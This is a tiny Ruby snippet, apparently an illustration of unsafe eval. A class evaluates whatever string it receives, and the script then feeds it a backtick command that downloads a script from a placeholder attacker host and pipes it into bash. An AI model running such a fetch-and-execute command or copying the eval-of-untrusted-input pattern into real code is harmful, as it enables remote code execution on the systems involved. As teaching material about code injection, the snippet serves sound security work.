class UnsafeCode
  def initialize(input)
    @data = input
  end

  def run_code
    eval(@data)
  end
end

unsafe_code = UnsafeCode.new("`curl https://attacker.com/malicious_script.sh | bash`")
unsafe_code.run_code